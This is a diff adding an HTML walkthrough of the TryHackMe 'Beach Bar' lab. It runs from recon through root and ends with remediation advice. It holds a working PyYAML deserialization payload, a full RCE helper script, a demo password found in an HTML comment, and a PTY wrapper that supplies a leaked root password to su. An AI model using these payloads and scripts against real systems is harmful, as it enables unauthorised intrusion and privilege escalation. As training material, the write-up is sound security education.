@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Beach Bar — TryHackMe Walkthrough</title>
+    <style>
+        /* ====== الألوان المستخرجة من صورة الشبح الوردي ====== */
+        :root {
+            /* الألوان الأساسية */
+            --bg-dark: #1B222A;           /* خلفية الصفحة - الكحلي الغامق */
+            --bg-card: #131415;           /* لون الوجه الأسود - للكروت */
+            --text-main: #E6E7E8;         /* لون العين الأبيض المائل للرمادي */
+            --text-muted: #7A828E;        /* لون الهاتف الرمادي */
+            
+            /* ألوان العناصر البارزة */
+            --pink-accent: #E69BC7;       /* لون جسم الشبح الوردي للعناوين */
+            --red-badge: #DF4254;         /* لون فقاعة LIKE */
+            --purple-tag: #8360B3;        /* لون شارة 3.1M */
+            
+            /* ألوان الحدود والظلال */
+            --border-color: #4a5b72;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            min-height: 100vh;
+            padding: 2rem;
+            cursor: none;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 2rem;
+            padding: 3rem;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), inset 0 0 40px rgba(74, 91, 114, 0.1);
+            position: relative;
+            z-index: 10;
+        }
+
+        /* ====== تنسيق المحتوى ====== */
+        h1 { color: var(--pink-accent); font-size: 2.5rem; margin-bottom: 1.5rem; text-shadow: 0 0 15px rgba(230, 155, 199, 0.1); }
+        h2 { color: var(--pink-accent); font-size: 1.8rem; margin: 2.5rem 0 1rem; border-bottom: 2px solid var(--purple-tag); padding-bottom: 0.5rem; }
+        h3 { color: var(--red-badge); font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: var(--text-muted); font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        
+        p { color: var(--text-main); margin-bottom: 1rem; }
+        a { color: var(--pink-accent); text-decoration: none; transition: color 0.3s; }
+        a:hover { color: #ffffff; }
+        
+        ul, ol { color: var(--text-main); padding-left: 1.5rem; margin-bottom: 1rem; }
+        li { margin-bottom: 0.3rem; }
+
+        /* ====== صندوق المعلومات ====== */
+        .meta-info {
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 1rem 2rem; 
+            padding: 1.2rem 1.5rem;
+            background: rgba(0, 0, 0, 0.4); 
+            border: 1px solid rgba(74, 91, 114, 0.2);
+            border-radius: 1rem; 
+            margin-bottom: 2.5rem; 
+        }
+        .meta-info span { 
+            color: var(--text-main); 
+            font-size: 0.95rem; 
+        }
+        .meta-info strong { 
+            color: var(--pink-accent); 
+        }
+
+        /* ====== الجداول ====== */
+        table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; border-radius: 0.8rem; overflow: hidden; }
+        th, td { padding: 1rem; border: 1px solid var(--border-color); text-align: left; color: var(--text-main); }
+        th { background: rgba(131, 96, 179, 0.2); color: var(--pink-accent); font-weight: bold; }
+
+        /* ====== الأكواد ====== */
+        code { background: rgba(0, 0, 0, 0.5); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: var(--pink-accent); font-size: 0.9em; }
+        pre { 
+            background: rgba(0, 0, 0, 0.7); 
+            border: 1px solid var(--border-color); 
+            border-left: 4px solid var(--red-badge); 
+            border-radius: 1rem; 
+            padding: 1.5rem; 
+            overflow-x: auto; 
+            margin: 1.5rem 0; 
+        }
+        pre code { background: transparent; color: var(--text-main); padding: 0; font-size: 0.9rem; }
+
+        /* ====== الصناديق ====== */
+        .box { padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1.5rem 0; }
+        .box.warning { border-left: 4px solid var(--red-badge); background: rgba(223, 66, 84, 0.1); }
+        .box.success { border-left: 4px solid var(--pink-accent); background: rgba(230, 155, 199, 0.05); }
+
+        /* ====== قسم الملخص ====== */
+        .chain-block { 
+            background: rgba(0, 0, 0, 0.4); 
+            border: 1px solid var(--red-badge); 
+            border-radius: 1rem; 
+            padding: 1.5rem; 
+            font-family: monospace; 
+            color: var(--text-main); 
+            margin: 1.5rem 0;
+            white-space: pre-wrap;
+        }
+
+        /* ====== تأثيرات الماوس ====== */
+        .mouse-trail {
+            position: fixed; width: 10px; height: 10px;
+            background: var(--pink-accent); border-radius: 50%;
+            pointer-events: none; z-index: 9999;
+            box-shadow: 0 0 15px var(--pink-accent), 0 0 40px rgba(230, 155, 199, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.2s, height 0.2s;
+        }
+        .mouse-glow-effect {
+            position: fixed; width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(223, 66, 84, 0.15), transparent 70%);
+            border-radius: 50%; pointer-events: none; z-index: 9998;
+            transform: translate(-50%, -50%);
+            transition: width 0.3s, height 0.3s;
+        }
+        .mouse-glow-effect.active { width: 350px; height: 350px; background: radial-gradient(circle, rgba(223, 66, 84, 0.25), transparent 70%); }
+    </style>
+</head>
+<body>
+
+    <!-- ====== الماوس ====== -->
+    <div class="mouse-trail" id="mouseTrail"></div>
+    <div class="mouse-glow-effect" id="mouseGlowEffect"></div>
+
+    <!-- ====== المحتوى ====== -->
+    <div class="container">
+        
+        <!-- العنوان الرئيسي -->
+        <h1>🏖️ Beach Bar — TryHackMe Complete Walkthrough</h1>
+
+        <!-- معلومات الرأس -->
+        <div class="meta-info" style="justify-content: center; text-align: center;">
+            <div style="display: flex; gap: 1rem 2rem; flex-wrap: wrap; justify-content: center; width: 100%;">
+                <span><strong>Challenge Type:</strong> Web / YAML Deserialization + Linux PE</span>
+                <span><strong>Platform:</strong> TryHackMe</span>
+                <span><strong>Author:</strong> NPX</span>
+            </div>
+            <div style="display: flex; gap: 1rem 2rem; flex-wrap: wrap; justify-content: center; width: 100%; margin-top: 5px;">
+                <span><strong>Target IP:</strong> 10.10.10.10</span>
+                <span><strong>Open Ports:</strong> 22 (SSH) / 80 (HTTP)</span>
+            </div>
+        </div>
+
+        <!-- جدول المحتويات -->
+        <h2>📋 Table of Contents</h2>
+        <ul>
+            <li><a href="#overview">1. Overview</a></li>
+            <li><a href="#recon">2. Reconnaissance</a></li>
+            <li><a href="#web-enum">3. Web Application Enumeration</a></li>
+            <li><a href="#yaml-rce">4. YAML Deserialization — PyYAML RCE</a></li>
+            <li><a href="#post-exploit">5. Post-Exploitation &amp; User Flag</a></li>
+            <li><a href="#privesc">6. Privilege Escalation — Credential Disclosure</a></li>
+            <li><a href="#root-flag">7. Root Flag</a></li>
+            <li><a href="#chain-summary">8. Attack Chain Summary</a></li>
+            <li><a href="#deep-dive">9. Vulnerability Deep Dive</a></li>
+            <li><a href="#remediation">10. Remediation Recommendations</a></li>
+            <li><a href="#commands">11. Complete Command Reference</a></li>
+        </ul>
+
+        <!-- القسم 1: Overview -->
+        <h2 id="overview">🎯 Overview</h2>
+        <table>
+            <thead>
+                <tr><th>Attribute</th><th>Detail</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><strong>Challenge Type</strong></td><td>Web / YAML Deserialization + Linux Privilege Escalation</td></tr>
+                <tr><td><strong>Platform</strong></td><td>TryHackMe</td></tr>
+                <tr><td><strong>Target IP</strong></td><td><code>10.10.10.10</code></td></tr>
+                <tr><td><strong>Hostname</strong></td><td><code>tryhackme-2404</code></td></tr>
+                <tr><td><strong>Open Ports</strong></td><td><code>22 (SSH)</code>, <code>80 (HTTP)</code></td></tr>
+                <tr><td><strong>User Flag</strong></td><td><code>THM{y4ml_...................._b34ch}</code></td></tr>
+                <tr><td><strong>Root Flag</strong></td><td><code>THM{cr3d3nt1....................b34ch_b4r}</code></td></tr>
+            </tbody>
+        </table>
+
+        <h3>🔐 Attack Path Summary</h3>
+        <div class="chain-block">Nmap Scan → Web Recon → Find Hardcoded Demo Creds (dj/dj)
+        ↓
+YAML Deserialization (!!python/object/apply:subprocess.check_output) → RCE as bartender
+        ↓
+Post-Exploitation → ps auxf → Root process leaks credential (--stream-pass SunsetSpritz2024!)
+        ↓
+su - root (using leaked password) → Root Access
+        ↓
+cat /root/root.txt → THM{...}</div>
+
+        <!-- القسم 2: Reconnaissance -->
+        <h2 id="recon">🔍 Reconnaissance</h2>
+        
+        <h3>1.1 Full Port Scan</h3>
+        <pre><code>nmap -Pn -p- -T4 --min-rate 2000 -oN ports.nmap 10.49.163.147</code></pre>
+        <p><strong>Output:</strong></p>
+        <pre><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+        <h3>1.2 Service Version Scan</h3>
+        <pre><code>nmap -Pn -sV -T4 -p 22,80 -oN services.nmap 10.49.163.147</code></pre>
+        <p><strong>Output:</strong></p>
+        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    Gunicorn Flask app</code></pre>
+
+        <h3>1.3 SSH Authentication Test</h3>
+        <pre><code>ssh -o StrictHostKeyChecking=no root@10.49.163.147</code></pre>
+        <p><strong>Result:</strong> <code>Permission denied (publickey).</code> → SSH uses publickey authentication only.</p>
+
+        <!-- القسم 3: Web Application Enumeration -->
+        <h2 id="web-enum">🌐 Web Application Enumeration</h2>
+
+        <h3>2.1 Initial Access — Login Page</h3>
+        <pre><code>curl -s -i http://10.49.163.147/</code></pre>
+        <p><strong>Response:</strong></p>
+        <pre><code>HTTP/1.1 302 FOUND
+Location: /login</code></pre>
+
+        <h3>2.2 Source Code Analysis — Hardcoded Credentials</h3>
+        <pre><code>curl -s http://10.49.163.147/login</code></pre>
+        <div class="box warning">
+            <p><strong>Critical Discovery — HTML Comment:</strong></p>
+            <pre><code>&lt;!--
+  staff note: the demo DJ login is still enabled for the soft opening.
+  dj / dj  -- swap this before the season starts (ticket BAR-7)
+--&gt;</code></pre>
+        </div>
+
+        <h3>2.3 Authentication as DJ</h3>
+        <pre><code>curl -s -i -c cookies.txt -b cookies.txt \
+  -X POST http://10.49.163.147/login \
+  -d 'username=dj&password=dj'</code></pre>
+        <p><strong>Response:</strong></p>
+        <pre><code>HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: session=eyJ1c2VyIjoiZGoifQ.Zt0UAA...</code></pre>
+
+        <h3>2.4 Authenticated Endpoints Enumeration</h3>
+        <pre><code>curl -s -b cookies.txt http://10.49.163.147/dashboard
+curl -s -b cookies.txt http://10.49.163.147/import
+curl -s -b cookies.txt http://10.49.163.147/export</code></pre>
+
+        <h3>2.5 Export — Understanding YAML Structure</h3>
+        <pre><code>curl -s -b cookies.txt http://10.49.163.147/export</code></pre>
+        <p><strong>Sample YAML Response:</strong></p>
+        <pre><code>playlist:
+  name: Summer Beats
+  tracks:
+    - artist: Beach Boys
+      title: Kokomo</code></pre>
+
+        <!-- القسم 4: YAML Deserialization -->
+        <h2 id="yaml-rce">🚀 YAML Deserialization — PyYAML RCE</h2>
+
+        <h3>3.1 Understanding the Vulnerability</h3>
+        <div class="box warning">
+            <p><strong>Source Code (discovered after RCE):</strong></p>
+            <pre><code># /opt/beach-bar/webapp/app.py
+@app.route("/import", methods=["GET", "POST"])
+@login_required
+def import_playlist():
+    content = request.form.get('playlist', '')
+    # ❌ UNSAFE DESERIALIZATION
+    parsed = yaml.load(content, Loader=yaml.Loader)   # &lt;-- VULNERABLE
+    return render_template('import.html', parsed=parsed)</code></pre>
+            <p><strong>Why is this vulnerable?</strong> <code>yaml.load()</code> with <code>Loader=yaml.Loader</code> deserializes arbitrary Python objects. This is equivalent to Python's <code>pickle.load()</code>.</p>
+        </div>
+
+        <h3>3.2 Test Payload — Command Execution</h3>
+        <pre><code>curl -s -b cookies.txt -X POST http://10.49.163.147/import \
+  --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'</code></pre>
+        <p><strong>Response:</strong></p>
+        <pre><code>b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'</code></pre>
+        <p><strong>✅ Confirmed:</strong> RCE as the <code>bartender</code> user.</p>
+
+        <h3>3.3 The RCE Helper Script (<code>rce.py</code>)</h3>
+        <pre><code>#!/usr/bin/env python3
+import sys, subprocess, urllib.request, urllib.parse, base64, re, html
+
+def run(cmd, timeout=25):
+    b64 = base64.b64encode(cmd.encode()).decode()
+    inner = f"echo {b64} | base64 -d | bash"
+    TAG = "!!python/object" + "/apply"
+    payload = f'{TAG}:subprocess.check_output [["bash","-c","{inner}"]]'
+    data = urllib.parse.urlencode({'playlist': payload}).encode()
+    req = urllib.request.Request('http://10.49.163.147/import', data=data, method='POST')
+    # Load session cookie
+    with open('cookies.txt', 'r') as f:
+        for line in f:
+            if 'session' in line:
+                sess = line.split()[-1]
+                req.add_header('Cookie', 'session=' + sess)
+                break
+    resp = urllib.request.urlopen(req, timeout=timeout)
+    body = resp.read().decode(errors='replace')
+    m = re.findall(r'&lt;pre&gt;(.*?)&lt;/pre&gt;', body, re.S)
+    return html.unescape(m[-1]) if m else body
+
+if __name__ == '__main__':
+    if len(sys.argv) &lt; 2:
+        print("Usage: python3 rce.py '&lt;command&gt;'")
+        sys.exit(1)
+    print(run(sys.argv[1]))</code></pre>
+
+        <!-- القسم 5: Post-Exploitation -->
+        <h2 id="post-exploit">🏁 Post-Exploitation &amp; User Flag</h2>
+        <h3>4.1 Identify the Current User</h3>
+        <pre><code>python3 rce.py 'id; hostname; whoami; pwd'</code></pre>
+        <p><strong>Output:</strong></p>
+        <pre><code>uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
+tryhackme-2404
+bartender
+/opt/beach-bar/webapp</code></pre>
+
+        <h3>4.2 Environment Inventory</h3>
+        <pre><code>python3 rce.py 'ls -la /home/'
+python3 rce.py 'cat /home/bartender/user.txt'</code></pre>
+        <p><strong>User Flag:</strong></p>
+        <pre><code>THM{y4ml_...................._b34ch}</code></pre>
+
+        <!-- القسم 6: Privilege Escalation -->
+        <h2 id="privesc">👑 Privilege Escalation — Credential Disclosure</h2>
+        
+        <h3>5.1 Process Enumeration — Finding the Leak</h3>
+        <pre><code>python3 rce.py 'ps auxf'</code></pre>
+        <div class="box success">
+            <p><strong>Critical Output — The Credential Leak:</strong></p>
+            <pre><code>root  611  0.0  0.2  20176  11756 ?  S  15:43  0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k</code></pre>
+        </div>
+
+        <h3>5.2 Credential Validation</h3>
+        <table>
+            <thead>
+                <tr><th>Test Command</th><th>Result</th><th>Analysis</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><code>ssh root@target</code></td><td>Permission denied (publickey)</td><td>SSH password auth disabled</td></tr>
+                <tr><td><code>su - root</code> (PTY)</td><td><strong>uid=0(root) ✅</strong></td><td><strong>The stream pass IS the root password!</strong></td></tr>
+            </tbody>
+        </table>
+
+        <h3>5.3 The PTY Wrapper (<code>/tmp/su_root.py</code>)</h3>
+        <pre><code>import pty, os, time, select
+
+def su_root(cmd):
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.execv('/bin/su', ['su', '-', 'root', '-c', cmd])
+    else:
+        buf = b''
+        sent = False
+        deadline = time.time() + 1.2
+        while time.time() &lt; deadline:
+            r, _, _ = select.select([fd], [], [], 0.2)
+            if r:
+                d = os.read(fd, 65536)
+                if not d: break
+                buf += d
+                if b'Password' in buf and not sent:
+                    os.write(fd, b'SunsetSpritz2024!\n')
+                    sent = True
+                    deadline = time.time() + 3.0
+        try:
+            while True:
+                r, _, _ = select.select([fd], [], [], 0.3)
+                if not r: break
+                d = os.read(fd, 65536)
+                if not d: break
+                buf += d
+        except OSError:
+            pass
+        os.close(fd)
+        return buf.decode(errors='replace')
+
+print(su_root('id; cat /root/root.txt'))</code></pre>
+
+        <!-- القسم 7: Root Flag -->
+        <h2 id="root-flag">🏴 Root Flag</h2>
+        <pre><code>python3 rce.py "echo '&lt;BASE64_ENCODED_SCRIPT&gt;' | base64 -d &gt; /tmp/su_root.py && python3 /tmp/su_root.py &gt; /tmp/su_root.out 2>&1; cat /tmp/su_root.out"</code></pre>
+        <p><strong>Output:</strong></p>
+        <pre><code>Password: 
+uid=0(root) gid=0(root) groups=0(root)
+THM{cr3d3nt14l....................................ch_b4r}</code></pre>
+
+        <!-- القسم 8: Attack Chain Summary -->
+        <h2 id="chain-summary">⚔️ Attack Chain Summary</h2>
+        <div class="chain-block">Nmap Scan: Port 80 & 22 → Web Recon: /login
+        ↓
+HTML Comment: dj/dj demo creds → Login as dj
+        ↓
+Discover /import endpoint → YAML Deserialization: yaml.load
+        ↓
+RCE as bartender → User Flag: /home/bartender/user.txt
+        ↓
+Process Enumeration: ps auxf → jukeboxd root process leaks --stream-pass
+        ↓
+SunsetSpritz2024! = root password → PTY wrapper: su - root
+        ↓
+Root Flag: /root/root.txt</div>
+
+        <!-- القسم 9: Vulnerability Deep Dive -->
+        <h2 id="deep-dive">🔬 Vulnerability Deep Dive</h2>
+        
+        <h3>6.1 CWE-502: Deserialization of Untrusted Data</h3>
+        <p>Python's <code>yaml.load()</code> with <code>Loader=yaml.Loader</code> can instantiate arbitrary Python objects using YAML's <code>!!python/object</code> tags.</p>
+        <div class="box warning">
+            <p><strong>How the Exploit Works:</strong></p>
+            <pre><code>!!python/object/apply:subprocess.check_output [["id"]]</code></pre>
+            <p>This tells PyYAML to import <code>subprocess</code>, call <code>check_output</code>, and pass <code>["id"]</code> as an argument.</p>
+        </div>
+
+        <h3>6.2 CWE-200: Exposure of Sensitive Information</h3>
+        <p>In Linux, every process's command-line arguments are visible via <code>/proc/&lt;pid&gt;/cmdline</code>. Even though <code>jukeboxd.py</code> runs as root, the arguments are world-readable.</p>
+
+        <!-- القسم 10: Remediation -->
+        <h2 id="remediation">🛡️ Remediation Recommendations</h2>
+        <h3>7.1 Fix YAML Deserialization</h3>
+        <pre><code># ❌ UNSAFE (as implemented)
+parsed = yaml.load(content, Loader=yaml.Loader)
+
+# ✅ SAFE — use safe_load
+parsed = yaml.safe_load(content)</code></pre>
+
+        <h3>7.2 Remove Credential from Process Arguments</h3>
+        <pre><code># ❌ UNSAFE — exposes secret to all users
+subprocess.Popen(['python', 'jukeboxd.py', '--stream-pass', password])
+
+# ✅ SAFE — read from environment variable
+import os
+password = os.environ.get('STREAM_PASS')
+subprocess.Popen(['python', 'jukeboxd.py', '--bitrate', '320k'])</code></pre>
+
+        <h3>7.3 Eliminate Password Reuse</h3>
+        <pre><code># ❌ UNSAFE — same password used in two contexts
+STREAM_PASSWORD = "SunsetSpritz2024!"
+
+# ✅ SAFE — separate passwords, stored securely
+STREAM_PASSWORD = os.urandom(32).hex()
+ROOT_PASSWORD = securely_generate_password()</code></pre>
+
+        <!-- القسم 11: Commands -->
+        <h2 id="commands">📝 Complete Command Reference</h2>
+        
+        <h3>Recon Commands</h3>
+        <pre><code>nmap -Pn -p- -T4 --min-rate 2000 10.49.163.147
+nmap -Pn -sV -T4 -p 22,80 10.49.163.147</code></pre>
+
+        <h3>Authentication & Session</h3>
+        <pre><code>curl -s -i -c cookies.txt -b cookies.txt -X POST \
+  http://10.49.163.147/login -d 'username=dj&password=dj'</code></pre>
+
+        <h3>RCE & Privilege Escalation</h3>
+        <pre><code>python3 rce.py 'id'
+python3 rce.py 'cat /home/bartender/user.txt'
+python3 rce.py 'ps auxf'</code></pre>
+
+        <!-- القسم 12: Conclusion & Flags -->
+        <h2>🏆 Conclusion</h2>
+        <p>Beach Bar demonstrates how YAML Deserialization and credential reuse can lead to full system compromise.</p>
+        <p><strong>Key Takeaways:</strong></p>
+        <ul>
+            <li>Never use <code>yaml.load()</code> with untrusted input.</li>
+            <li>Never pass secrets as command-line arguments.</li>
+            <li>Never reuse passwords across different contexts.</li>
+        </ul>
+
+        <h3>📜 Flags</h3>
+        <table>
+            <thead>
+                <tr><th>Flag</th><th>Value</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><strong>User</strong></td><td><code>THM{y4ml_...................._b34ch}</code></td></tr>
+                <tr><td><strong>Root</strong></td><td><code>THM{cr3d3n..............._b34ch_b4r}</code></td></tr>
+            </tbody>
+        </table>
+
+    </div>
+
+    <!-- ====== سكريبت الماوس ====== -->
+    <script>
+        (function() {
+            const trail = document.getElementById("mouseTrail");
+            const glow = document.getElementById("mouseGlowEffect");
+            let x = 0, y = 0, trailX = 0, trailY = 0;
+
+            document.addEventListener("mousemove", (e) => {
+                x = e.clientX; y = e.clientY;
+                glow.style.left = x + "px"; glow.style.top = y + "px";
+                glow.classList.add("active");
+                clearTimeout(window.glowTimeout);
+                window.glowTimeout = setTimeout(() => glow.classList.remove("active"), 200);
+            });
+
+            setInterval(() => {
+                trailX += (x - trailX) * 0.15;
+                trailY += (y - trailY) * 0.15;
+                trail.style.left = trailX + "px"; trail.style.top = trailY + "px";
+            }, 16);
+
+            document.addEventListener("mouseleave", () => { trail.style.opacity = "0"; glow.style.opacity = "0"; });
+            document.addEventListener("mouseenter", () => { trail.style.opacity = "1"; glow.style.opacity = "1"; });
+        })();
+    </script>
+</body>
+</html>
